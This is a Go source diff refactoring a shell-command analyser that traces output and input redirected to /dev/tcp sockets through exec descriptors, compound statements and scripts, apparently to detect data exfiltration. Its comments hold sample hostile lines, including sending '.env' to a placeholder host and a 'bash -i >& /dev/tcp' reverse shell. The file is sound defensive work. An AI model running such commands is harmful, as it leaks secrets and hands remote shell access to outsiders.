@@ -27,17 +27,12 @@ const (
 // from a network pseudo-file. The result is parallel to commands, or nil when there is none.
 //
 // A command has one when a redirection of its own names the pseudo-file
-// (`cat .env > /dev/tcp/host/4444`), and when it duplicates a descriptor that an earlier
-// `exec` of the same shell opened on one (`exec 3<>/dev/tcp/host/4444; cat .env >&3`): the
-// exec has the redirection that opens the connection, the later command the one that uses
-// it, in the direction it uses it. A standard output or input the command does not redirect
-// itself goes where the compound statement around it sends it (`{ cat .env; } >
-// /dev/tcp/host/4444`), or else where a bare exec of its shell left it (`exec
-// >/dev/tcp/host/4444; cat .env`): its output when it is the last stage of its pipeline, its
-// input when it is the first. What an exec leaves open is open to the commands after it in its
-// subshell or substitution, and in the subshells, substitutions and scripts inside that
-// (`(exec 3>/dev/tcp/host/4444; (cat .env >&3))`), and not after the subshell or substitution
-// ends; a descriptor whose number is not written as a number is not followed.
+// (`cat .env > /dev/tcp/host/4444`), and when it duplicates a descriptor that is open on one
+// (`exec 3<>/dev/tcp/host/4444; cat .env >&3`): the exec has the redirection that opens the
+// connection, the later command the one that uses it, in the direction it uses it. A standard
+// output or input the command does not redirect itself goes where it is sent from outside
+// (descriptorSocket): its output when it is the last stage of its pipeline, its input when it is
+// the first. A descriptor whose number is not written as a number is not followed.
 func SocketRedirects(commands []Command) [][]SocketRedirect {
 	var out [][]SocketRedirect
 	// open are the descriptors bare execs redirected, in the order they ran.
@@ -46,7 +41,7 @@ func SocketRedirects(commands []Command) [][]SocketRedirect {
 		c := &commands[i]
 		// Only a bare exec's redirections outlast the command.
 		keeps := len(c.Argv) == 1 && c.Argv[0].Known && c.Argv[0].Text == "exec"
-		for _, r := range c.Redirects {
+		for k, r := range c.Redirects {
 			found := SocketRedirect{Op: SocketWrite}
 			switch r.Op {
 			case ">", ">>", ">|", "&>", "&>>":
@@ -55,19 +50,14 @@ func SocketRedirects(commands []Command) [][]SocketRedirect {
 			case "<>":
 				found.Op = SocketReadWrite
 			case ">&", "<&":
-				if r.Op == "<&" {
+				// A copy onto standard input reads from the socket (`bash -i >& /dev/tcp/h/1 0>&1`).
+				if r.Op == "<&" || descriptor(r) == "0" {
 					found.Op = SocketRead
 				}
 			default:
 				continue // a here-document or a here-string
 			}
-			target := r.Target.Unquoted
-			if number, isNumber := descriptorNumber(target); (r.Op == ">&" || r.Op == "<&") && (isNumber || target == "-") {
-				// A duplicated descriptor is the socket an exec opened it on.
-				found.Path = openOn(commands, open, i, number)
-			} else if isSocketPath(target) {
-				found.Path = target
-			}
+			found.Path = redirectSocket(commands, open, i, k)
 			if keeps {
 				// An empty path closes the descriptor, or says it now names something else.
 				open = append(open, openDescriptor{shell: c.shell, fd: descriptor(r), from: c.Offset, to: c.execEnd, path: found.Path})
@@ -87,14 +77,10 @@ func SocketRedirects(commands []Command) [][]SocketRedirect {
 			fd string
 			op SocketOp
 		}{{"1", SocketWrite}, {"0", SocketRead}} {
-			if redirectsDescriptor(c, std.fd) {
+			if lastRedirect(c, std.fd, len(c.Redirects)) >= 0 {
 				continue
 			}
-			path, decided := compoundSocket(commands, i, std.fd)
-			// What a substitution's commands write is the substitution's value, not the stream.
-			if !decided && (std.fd == "1" && c.within == 0 && isLastStage(commands, i) || std.fd == "0" && c.Stage == 0) {
-				path = openOn(commands, open, i, std.fd)
-			}
+			path := descriptorSocket(commands, open, i, std.fd)
 			if path == "" {
 				continue
 			}
@@ -117,61 +103,75 @@ type openDescriptor struct {
 	path     string
 }
 
-// openOn returns the socket descriptor fd is open on for command i, as the execs before it left
-// it: the last one that redirected fd where i runs, in i's own shell, or else in the shell that
-// started it, and so on out to the command line. In a shell that started i's, i runs where that
-// shell's command (the bash -c of the script i is in) does.
-func openOn(commands []Command, open []openDescriptor, i int, fd string) string {
-	if len(open) == 0 {
-		return ""
+// redirectSocket returns the socket redirection k of command i opens its descriptor on: the
+// pseudo-file it names, or, for a duplication (>&3, <&3), the socket the descriptor it copies is
+// open on there, as the redirections before it left it (`exec 3<>/dev/tcp/h/1 >&3`) or else as it
+// is open outside the command (descriptorSocket).
+func redirectSocket(commands []Command, open []openDescriptor, i, k int) string {
+	r := &commands[i].Redirects[k]
+	target := r.Target.Unquoted
+	number, isNumber := descriptorNumber(target)
+	switch {
+	case (r.Op == ">&" || r.Op == "<&") && (isNumber || target == "-"):
+		if earlier := lastRedirect(&commands[i], number, k); earlier >= 0 {
+			return redirectSocket(commands, open, i, earlier)
+		}
+		return descriptorSocket(commands, open, i, number)
+	case isSocketPath(target):
+		return target
 	}
-	shell, at := commands[i].shell, commands[i].Offset
+	return ""
+}
+
+// descriptorSocket returns the socket command i's descriptor fd is open on when the command does
+// not redirect it itself: where the innermost compound statement around it that redirects fd
+// sends it (`{ cat .env; } > /dev/tcp/host/4444`, `{ ..; } >&3`), or else where the last bare exec
+// before it in its subshell or substitution, or in one around that, left it (`exec
+// >/dev/tcp/host/4444; cat .env`, `(exec 3>/dev/tcp/h/1; (cat .env >&3))`), or else, for a
+// command of a script, where the shell running the script has it (`bash -c 'cat .env' >
+// /dev/tcp/host/4444`), and so on out to the command line. Standard output is the stream only for
+// a last stage of a pipeline outside a substitution, whose commands write the substitution's
+// value, and standard input only for a first stage.
+func descriptorSocket(commands []Command, open []openDescriptor, i int, fd string) string {
 	for {
+		c := &commands[i]
+		for k := c.outer; k != 0; k = commands[k-1].outer {
+			compound := &commands[k-1]
+			if c.Pipeline != compound.Pipeline && (fd == "1" && !isLastStage(commands, i) || fd == "0" && c.Stage > 0) {
+				return "" // its own pipeline takes the descriptor
+			}
+			if r := lastRedirect(compound, fd, len(compound.Redirects)); r >= 0 {
+				return redirectSocket(commands, open, int(k-1), r)
+			}
+		}
+		if fd == "1" && (c.within != 0 || !isLastStage(commands, i)) || fd == "0" && c.Stage > 0 {
+			return ""
+		}
 		for k := len(open) - 1; k >= 0; k-- {
-			if o := &open[k]; o.shell == shell && o.fd == fd && o.from < at && (o.to == 0 || at < o.to) {
+			if o := &open[k]; o.shell == c.shell && o.fd == fd && o.from < c.Offset && (o.to == 0 || c.Offset < o.to) {
 				return o.path
 			}
 		}
-		if shell == 0 {
+		if c.shell == 0 {
 			return ""
 		}
-		runner := &commands[shell-1]
-		shell, at = runner.shell, runner.Offset
+		// A command of a script: the descriptor is the shell's, as the shell's command has it.
+		i = int(c.shell) - 1
+		if r := lastRedirect(&commands[i], fd, len(commands[i].Redirects)); r >= 0 {
+			return redirectSocket(commands, open, i, r)
+		}
 	}
 }
 
-// redirectsDescriptor reports whether c redirects descriptor fd itself.
-func redirectsDescriptor(c *Command, fd string) bool {
-	for _, r := range c.Redirects {
-		if descriptor(r) == fd || fd == "1" && (r.Op == "&>" || r.Op == "&>>") {
-			return true
+// lastRedirect returns the index of the last of the first n redirections of c that redirects
+// descriptor fd, or -1.
+func lastRedirect(c *Command, fd string, n int) int {
+	for k := n - 1; k >= 0; k-- {
+		if descriptor(c.Redirects[k]) == fd {
+			return k
 		}
 	}
-	return false
-}
-
-// compoundSocket returns the socket the compound statements around command i send its
-// descriptor fd to, and whether one of them decides where fd goes at all: the innermost that
-// redirects it does. Only a statement of the compound itself, or the last stage of a pipeline
-// inside it, writes to the compound's standard output, and only a first stage reads its input.
-func compoundSocket(commands []Command, i int, fd string) (path string, decided bool) {
-	c := &commands[i]
-	for k := c.outer; k != 0; k = commands[k-1].outer {
-		compound := &commands[k-1]
-		if c.Pipeline != compound.Pipeline && (fd == "1" && !isLastStage(commands, i) || fd == "0" && c.Stage > 0) {
-			return "", true // its own pipeline takes the descriptor
-		}
-		for _, r := range compound.Redirects {
-			if descriptor(r) != fd && !(fd == "1" && (r.Op == "&>" || r.Op == "&>>")) {
-				continue
-			}
-			if target := r.Target.Unquoted; isSocketPath(target) {
-				return target, true
-			}
-			return "", true
-		}
-	}
-	return "", false
+	return -1
 }
 
 // isLastStage reports whether no later stage of command i's pipeline takes its output.
